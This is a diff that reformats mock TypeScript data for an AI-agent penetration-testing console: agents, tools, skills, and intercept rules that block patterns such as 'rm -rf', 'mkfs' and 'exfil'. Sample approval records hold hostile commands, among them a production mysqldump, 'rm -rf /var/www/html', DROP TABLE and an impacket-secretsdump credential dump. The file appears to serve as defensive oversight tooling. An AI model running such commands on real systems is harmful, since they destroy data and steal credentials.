-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m0694");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     role: "mainagent",
     builtin: true,
     enabled: true,
-    get description() { return swt("interface.m2674"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2674");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     max_turns: 0,
     web_search: true,
     mcp_count: 2,
@@ -3345,8 +4542,12 @@ export const agents: Agent[] = [
     role: "worker",
     builtin: true,
     enabled: true,
-    get description() { return swt("interface.m2675"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2675");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     max_turns: 40,
     run_seconds: 1800,
     web_search: false,
@@ -3358,13 +4559,21 @@ export const agents: Agent[] = [
   {
     id: "5",
     key: "recon-bot",
-    get name() { return swt("interface.m2676"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2676");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     role: "custom",
     builtin: false,
     enabled: true,
-    get description() { return swt("interface.m2677"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2677");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     max_turns: 12,
     mcp_count: 1,
     skill_count: 1,
@@ -3373,24 +4582,89 @@ export const agents: Agent[] = [
 ];
 
 const promptVars: PromptVar[] = [
-  { name: "Goal", get description() { return swt("interface.m2678"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); }, get example() { return swt("interface.m2679"); },
-    set example(value: string) { Object.defineProperty(this, "example", { value, writable: true, enumerable: true, configurable: true }); }, source: "runtime" },
-  { name: "AssetSummary", get description() { return swt("interface.m2680"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); }, get example() { return swt("interface.m2681"); },
-    set example(value: string) { Object.defineProperty(this, "example", { value, writable: true, enumerable: true, configurable: true }); }, source: "distilled" },
-  { name: "RouteHint", get description() { return swt("interface.m2682"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); }, get example() { return swt("interface.m2683"); },
-    set example(value: string) { Object.defineProperty(this, "example", { value, writable: true, enumerable: true, configurable: true }); }, source: "exploration" },
+  {
+    name: "Goal",
+    get description() {
+      return swt("interface.m2678");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get example() {
+      return swt("interface.m2679");
+    },
+    set example(value: string) {
+      Object.defineProperty(this, "example", { value, writable: true, enumerable: true, configurable: true });
+    },
+    source: "runtime",
+  },
+  {
+    name: "AssetSummary",
+    get description() {
+      return swt("interface.m2680");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get example() {
+      return swt("interface.m2681");
+    },
+    set example(value: string) {
+      Object.defineProperty(this, "example", { value, writable: true, enumerable: true, configurable: true });
+    },
+    source: "distilled",
+  },
+  {
+    name: "RouteHint",
+    get description() {
+      return swt("interface.m2682");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get example() {
+      return swt("interface.m2683");
+    },
+    set example(value: string) {
+      Object.defineProperty(this, "example", { value, writable: true, enumerable: true, configurable: true });
+    },
+    source: "exploration",
+  },
 ];
 
 const promptVersions: PromptVersion[] = [
-  { version: 3, ts: T("2026-07-25T10:00:00Z"), get note() { return swt("interface.m2684"); },
-    set note(value: string) { Object.defineProperty(this, "note", { value, writable: true, enumerable: true, configurable: true }); }, get template_text() { return swt("interface.m2685"); },
-    set template_text(value: string) { Object.defineProperty(this, "template_text", { value, writable: true, enumerable: true, configurable: true }); } },
-  { version: 2, ts: T("2026-07-20T10:00:00Z"), get note() { return swt("interface.m2686"); },
-    set note(value: string) { Object.defineProperty(this, "note", { value, writable: true, enumerable: true, configurable: true }); }, get template_text() { return swt("interface.m2687"); },
-    set template_text(value: string) { Object.defineProperty(this, "template_text", { value, writable: true, enumerable: true, configurable: true }); } },
+  {
+    version: 3,
+    ts: T("2026-07-25T10:00:00Z"),
+    get note() {
+      return swt("interface.m2684");
+    },
+    set note(value: string) {
+      Object.defineProperty(this, "note", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get template_text() {
+      return swt("interface.m2685");
+    },
+    set template_text(value: string) {
+      Object.defineProperty(this, "template_text", { value, writable: true, enumerable: true, configurable: true });
+    },
+  },
+  {
+    version: 2,
+    ts: T("2026-07-20T10:00:00Z"),
+    get note() {
+      return swt("interface.m2686");
+    },
+    set note(value: string) {
+      Object.defineProperty(this, "note", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get template_text() {
+      return swt("interface.m2687");
+    },
+    set template_text(value: string) {
+      Object.defineProperty(this, "template_text", { value, writable: true, enumerable: true, configurable: true });
+    },
+  },
 ];
 
 export function agentDetail(key: string): AgentDetail {
@@ -3437,20 +4711,62 @@ export const mcpServers: MCPServer[] = [
 
 export const mcpToolsById: Record<number, MCPTool[]> = {
   1: [
-    { name: "host_info", get description() { return swt("interface.m2691"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); } },
-    { name: "search", get description() { return swt("interface.m2692"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); } },
-    { name: "dns_resolve", get description() { return swt("interface.m2693"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); } },
+    {
+      name: "host_info",
+      get description() {
+        return swt("interface.m2691");
+      },
+      set description(value: string) {
+        Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
+    {
+      name: "search",
+      get description() {
+        return swt("interface.m2692");
+      },
+      set description(value: string) {
+        Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
+    {
+      name: "dns_resolve",
+      get description() {
+        return swt("interface.m2693");
+      },
+      set description(value: string) {
+        Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
   ],
   2: [
-    { name: "browser_navigate", get description() { return swt("interface.m2694"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); } },
-    { name: "browser_click", get description() { return swt("interface.m2695"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); } },
-    { name: "browser_snapshot", get description() { return swt("interface.m2696"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); } },
+    {
+      name: "browser_navigate",
+      get description() {
+        return swt("interface.m2694");
+      },
+      set description(value: string) {
+        Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
+    {
+      name: "browser_click",
+      get description() {
+        return swt("interface.m2695");
+      },
+      set description(value: string) {
+        Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
+    {
+      name: "browser_snapshot",
+      get description() {
+        return swt("interface.m2696");
+      },
+      set description(value: string) {
+        Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
   ],
 };
 
@@ -3458,8 +4774,12 @@ export const mcpToolsById: Record<number, MCPTool[]> = {
 export const skills: SkillItem[] = [
   {
     name: "api-recon",
-    get description() { return swt("interface.m2697"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2697");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     license: "MIT",
     mcps: [],
     files: ["SKILL.md", "scripts/enum.py"],
@@ -3470,8 +4790,12 @@ export const skills: SkillItem[] = [
   },
   {
     name: "playwright-cli",
-    get description() { return swt("interface.m2698"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2698");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     mcps: ["playwright"],
     files: ["SKILL.md"],
     calls: 7,
@@ -3481,8 +4805,12 @@ export const skills: SkillItem[] = [
   },
   {
     name: "scopesentry",
-    get description() { return swt("interface.m2699"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2699");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     files: ["SKILL.md", "assets/mapping.md"],
     calls: 0,
     tasks: 0,
@@ -3505,8 +4833,12 @@ export const tools: Tool[] = [
   {
     key: "bash",
     system: true,
-    get description() { return swt("interface.m2700"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2700");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
     agents: ["worker", "mainagent"],
     enabled: true,
@@ -3516,8 +4848,12 @@ export const tools: Tool[] = [
   {
     key: "report_finding",
     system: true,
-    get description() { return swt("interface.m2701"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2701");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     schema: {
       type: "object",
       properties: {
@@ -3536,8 +4872,12 @@ export const tools: Tool[] = [
   {
     key: "upsert_asset",
     system: true,
-    get description() { return swt("interface.m2702"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2702");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } },
     agents: ["worker"],
     enabled: true,
@@ -3547,8 +4887,12 @@ export const tools: Tool[] = [
   {
     key: "list_goals",
     system: true,
-    get description() { return swt("interface.m2703"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2703");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     schema: { type: "object", properties: {} },
     agents: ["planner"],
     enabled: true,
@@ -3558,8 +4902,12 @@ export const tools: Tool[] = [
   {
     key: "nuclei_scan",
     system: false,
-    get description() { return swt("interface.m2704"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2704");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     schema: {
       type: "object",
       properties: { target: { type: "string" }, template: { type: "string" } },
@@ -3632,16 +4980,24 @@ export const llmPool: LLMPoolStatus = {
 export const interceptRules: InterceptRule[] = [
   {
     id: 1,
-    get name() { return swt("interface.m2705"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2705");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     enabled: true,
     priority: 10,
     match_target: "tool_input",
     match_type: "regex",
     pattern: "rm\\s+-rf|mkfs|dd\\s+if=",
     action: "ask",
-    get message() { return swt("interface.m2706"); },
-    set message(value: string) { Object.defineProperty(this, "message", { value, writable: true, enumerable: true, configurable: true }); },
+    get message() {
+      return swt("interface.m2706");
+    },
+    set message(value: string) {
+      Object.defineProperty(this, "message", { value, writable: true, enumerable: true, configurable: true });
+    },
     timeout_enabled: true,
     timeout_seconds: 120,
     timeout_action: "deny",
@@ -3650,16 +5006,24 @@ export const interceptRules: InterceptRule[] = [
   },
   {
     id: 2,
-    get name() { return swt("interface.m2707"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2707");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     enabled: true,
     priority: 20,
     match_target: "tool_input",
     match_type: "string",
     pattern: "exfil",
     action: "deny",
-    get message() { return swt("interface.m2708"); },
-    set message(value: string) { Object.defineProperty(this, "message", { value, writable: true, enumerable: true, configurable: true }); },
+    get message() {
+      return swt("interface.m2708");
+    },
+    set message(value: string) {
+      Object.defineProperty(this, "message", { value, writable: true, enumerable: true, configurable: true });
+    },
     timeout_enabled: false,
     timeout_seconds: 0,
     timeout_action: "deny",
@@ -3677,8 +5041,12 @@ export const interceptPending: InterceptPending[] = [
     tool_name: "bash",
     tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" },
     status: "pending",
-    get reason() { return swt("interface.m2709"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); },
+    get reason() {
+      return swt("interface.m2709");
+    },
+    set reason(value: string) {
+      Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+    },
     created_at: T("2026-07-26T03:58:00Z"),
   },
 ];
@@ -3692,14 +5060,22 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "dd if=/dev/zero of=/tmp/x" },
     status: "denied",
-    get reason() { return swt("interface.m2705"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); },
+    get reason() {
+      return swt("interface.m2705");
+    },
+    set reason(value: string) {
+      Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+    },
     created_at: T("2026-07-25T20:00:00Z"),
     decided_at: T("2026-07-25T20:01:00Z"),
     conv_title: "",
     conv_agent_key: "",
-    get rule_name() { return swt("interface.m2705"); },
-    set rule_name(value: string) { Object.defineProperty(this, "rule_name", { value, writable: true, enumerable: true, configurable: true }); },
+    get rule_name() {
+      return swt("interface.m2705");
+    },
+    set rule_name(value: string) {
+      Object.defineProperty(this, "rule_name", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     id: 91,
@@ -3708,8 +5084,12 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "rm -rf /var/www/html" },
     status: "denied",
-    get reason() { return swt("interface.m2710"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); },
+    get reason() {
+      return swt("interface.m2710");
+    },
+    set reason(value: string) {
+      Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+    },
     created_at: T("2026-07-25T18:00:00Z"),
     decided_at: T("2026-07-25T18:00:05Z"),
     conv_title: "",
@@ -3724,14 +5104,22 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
     status: "allowed",
-    get reason() { return swt("interface.m2707"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); },
+    get reason() {
+      return swt("interface.m2707");
+    },
+    set reason(value: string) {
+      Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+    },
     created_at: T("2026-07-26T00:05:00Z"),
     decided_at: T("2026-07-26T00:06:00Z"),
     conv_title: "",
     conv_agent_key: "",
-    get rule_name() { return swt("interface.m2707"); },
-    set rule_name(value: string) { Object.defineProperty(this, "rule_name", { value, writable: true, enumerable: true, configurable: true }); },
+    get rule_name() {
+      return swt("interface.m2707");
+    },
+    set rule_name(value: string) {
+      Object.defineProperty(this, "rule_name", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     id: 93,
@@ -3740,8 +5128,12 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: 'mysql -e "DROP TABLE users_bak_0921"' },
     status: "pending",
-    get reason() { return swt("interface.m2711"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); },
+    get reason() {
+      return swt("interface.m2711");
+    },
+    set reason(value: string) {
+      Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+    },
     created_at: T("2026-07-25T15:14:00Z"),
     conv_title: "",
     conv_agent_key: "",
@@ -3755,12 +5147,23 @@ interceptHistory.unshift({
   task_id: "t-acme-web",
   agent_name: "work#1",
   tool_name: "Write",
-  tool_input: { path: "reports/summary.md", get content() { return swt("interface.m2712"); },
-    set content(value: string) { Object.defineProperty(this, "content", { value, writable: true, enumerable: true, configurable: true }); } },
+  tool_input: {
+    path: "reports/summary.md",
+    get content() {
+      return swt("interface.m2712");
+    },
+    set content(value: string) {
+      Object.defineProperty(this, "content", { value, writable: true, enumerable: true, configurable: true });
+    },
+  },
   status: "allowed",
   decision_source: "model",
-  get reason() { return swt("interface.m2713"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); },
+  get reason() {
+    return swt("interface.m2713");
+  },
+  set reason(value: string) {
+    Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+  },
   created_at: T("2026-07-26T08:00:00Z"),
   decided_at: T("2026-07-26T08:00:02Z"),
   conv_title: "",
@@ -3774,11 +5177,22 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-write-report",
     correlation: "exact",
     input_digest: "a3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458ec1234",
-    get user_message() { return swt("interface.m2714"); },
-    set user_message(value: string) { Object.defineProperty(this, "user_message", { value, writable: true, enumerable: true, configurable: true }); },
+    get user_message() {
+      return swt("interface.m2714");
+    },
+    set user_message(value: string) {
+      Object.defineProperty(this, "user_message", { value, writable: true, enumerable: true, configurable: true });
+    },
     context: [
-      { kind: "user", get text() { return swt("interface.m2715"); },
-    set text(value: string) { Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true }); } },
+      {
+        kind: "user",
+        get text() {
+          return swt("interface.m2715");
+        },
+        set text(value: string) {
+          Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true });
+        },
+      },
       {
         kind: "tool_use",
         tool: "Read",
@@ -3789,20 +5203,32 @@ export const interceptDetails: Record<number, InterceptAudit> = {
         kind: "tool_result",
         tool: "Read",
         tool_use_id: "call-read-evidence",
-        get text() { return swt("interface.m2716"); },
-    set text(value: string) { Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true }); },
+        get text() {
+          return swt("interface.m2716");
+        },
+        set text(value: string) {
+          Object.defineProperty(this, "text", { value, writable: true, enumerable: true, configurable: true });
+        },
       },
     ],
     captured_at: T("2026-07-26T08:00:00Z"),
     initial_action: "allow",
-    get initial_reason() { return swt("interface.m2713"); },
-    set initial_reason(value: string) { Object.defineProperty(this, "initial_reason", { value, writable: true, enumerable: true, configurable: true }); },
+    get initial_reason() {
+      return swt("interface.m2713");
+    },
+    set initial_reason(value: string) {
+      Object.defineProperty(this, "initial_reason", { value, writable: true, enumerable: true, configurable: true });
+    },
     effective_action: "allow",
     config_digest: "b4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fd1234",
     profile_id: 1,
     execution_status: "succeeded",
-    get output() { return swt("interface.m2717"); },
-    set output(value: string) { Object.defineProperty(this, "output", { value, writable: true, enumerable: true, configurable: true }); },
+    get output() {
+      return swt("interface.m2717");
+    },
+    set output(value: string) {
+      Object.defineProperty(this, "output", { value, writable: true, enumerable: true, configurable: true });
+    },
     execution_ended_at: T("2026-07-26T08:00:03Z"),
   },
   93: {
@@ -3810,13 +5236,21 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-pending-review",
     correlation: "exact",
     input_digest: "c5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670ae1234",
-    get user_message() { return swt("interface.m2718"); },
-    set user_message(value: string) { Object.defineProperty(this, "user_message", { value, writable: true, enumerable: true, configurable: true }); },
+    get user_message() {
+      return swt("interface.m2718");
+    },
+    set user_message(value: string) {
+      Object.defineProperty(this, "user_message", { value, writable: true, enumerable: true, configurable: true });
+    },
     context: [],
     captured_at: T("2026-07-25T15:14:00Z"),
     initial_action: "ask",
-    get initial_reason() { return swt("interface.m2719"); },
-    set initial_reason(value: string) { Object.defineProperty(this, "initial_reason", { value, writable: true, enumerable: true, configurable: true }); },
+    get initial_reason() {
+      return swt("interface.m2719");
+    },
+    set initial_reason(value: string) {
+      Object.defineProperty(this, "initial_reason", { value, writable: true, enumerable: true, configurable: true });
+    },
     profile_id: 1,
     execution_status: "not_started",
   },
@@ -3827,8 +5261,12 @@ export const conversations: Conversation[] = [
   {
     id: 1,
     agent_key: "mainagent",
-    get title() { return swt("interface.m2720"); },
-    set title(value: string) { Object.defineProperty(this, "title", { value, writable: true, enumerable: true, configurable: true }); },
+    get title() {
+      return swt("interface.m2720");
+    },
+    set title(value: string) {
+      Object.defineProperty(this, "title", { value, writable: true, enumerable: true, configurable: true });
+    },
     llm_profile_id: 1,
     pinned: true,
     pinned_at: T("2026-07-26T04:00:00Z"),
@@ -3838,8 +5276,12 @@ export const conversations: Conversation[] = [
   {
     id: 2,
     agent_key: "mainagent",
-    get title() { return swt("interface.m2721"); },
-    set title(value: string) { Object.defineProperty(this, "title", { value, writable: true, enumerable: true, configurable: true }); },
+    get title() {
+      return swt("interface.m2721");
+    },
+    set title(value: string) {
+      Object.defineProperty(this, "title", { value, writable: true, enumerable: true, configurable: true });
+    },
     llm_profile_id: 2,
     created_at: T("2026-07-24T16:00:00Z"),
     updated_at: T("2026-07-24T17:20:00Z"),
@@ -3847,8 +5289,12 @@ export const conversations: Conversation[] = [
   {
     id: 3,
     agent_key: "mainagent",
-    get title() { return swt("interface.m2722"); },
-    set title(value: string) { Object.defineProperty(this, "title", { value, writable: true, enumerable: true, configurable: true }); },
+    get title() {
+      return swt("interface.m2722");
+    },
+    set title(value: string) {
+      Object.defineProperty(this, "title", { value, writable: true, enumerable: true, configurable: true });
+    },
     llm_profile_id: 1,
     created_at: T("2026-07-25T15:45:00Z"),
     updated_at: T("2026-07-26T00:25:00Z"),
@@ -3857,15 +5303,29 @@ export const conversations: Conversation[] = [
 
 export const conversationMessages: Record<number, Activity[]> = {
   1: [
-    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", get summary() { return swt("interface.m2723"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } },
+    {
+      seq: 1,
+      worker: "user",
+      ts: T("2026-07-25T10:00:00Z"),
+      kind: "user",
+      get summary() {
+        return swt("interface.m2723");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-25T10:00:04Z"),
       kind: "thinking",
-      get summary() { return swt("interface.m2724"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2724");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 3,
@@ -3884,8 +5344,12 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c11",
       summary: "element-ui\ncsrf",
-      get detail() { return swt("interface.m2725"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+      get detail() {
+        return swt("interface.m2725");
+      },
+      set detail(value: string) {
+        Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 5,
@@ -3905,26 +5369,48 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c12",
       summary: "401\\n401\\n401\\n401\\n401",
-      get detail() { return swt("interface.m2726"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+      get detail() {
+        return swt("interface.m2726");
+      },
+      set detail(value: string) {
+        Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 7,
       worker: "mainagent",
       ts: T("2026-07-25T10:00:30Z"),
       kind: "text",
-      get summary() { return swt("interface.m2727"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2727");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
-    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", get summary() { return swt("interface.m2728"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } },
+    {
+      seq: 8,
+      worker: "user",
+      ts: T("2026-07-26T03:40:00Z"),
+      kind: "user",
+      get summary() {
+        return swt("interface.m2728");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
+    },
     {
       seq: 9,
       worker: "mainagent",
       ts: T("2026-07-26T03:40:05Z"),
       kind: "text",
-      get summary() { return swt("interface.m2729"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2729");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
   ],
   2: [
@@ -3933,16 +5419,24 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-24T16:00:00Z"),
       kind: "user",
-      get summary() { return swt("interface.m2730"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2730");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-24T16:00:05Z"),
       kind: "thinking",
-      get summary() { return swt("interface.m2731"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2731");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 3,
@@ -3961,8 +5455,12 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c21",
       summary: '{ "id": 42, "role": "user" }',
-      get detail() { return swt("interface.m2732"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+      get detail() {
+        return swt("interface.m2732");
+      },
+      set detail(value: string) {
+        Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 5,
@@ -3971,8 +5469,12 @@ export const conversationMessages: Record<number, Activity[]> = {
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c22",
-      get summary() { return swt("interface.m2733"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2733");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 6,
@@ -3982,16 +5484,24 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c22",
       summary: '{"alg":"HS256","typ":"JWT"}',
-      get detail() { return swt("interface.m2734"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+      get detail() {
+        return swt("interface.m2734");
+      },
+      set detail(value: string) {
+        Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 7,
       worker: "mainagent",
       ts: T("2026-07-24T16:01:00Z"),
       kind: "text",
-      get summary() { return swt("interface.m2735"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2735");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
   ],
   3: [
@@ -4000,32 +5510,48 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-25T15:45:00Z"),
       kind: "user",
-      get summary() { return swt("interface.m2736"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+      get summary() {
+        return swt("interface.m2736");
+      },
+      set summary(value: string) {
+        Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
     {
       seq: 2,
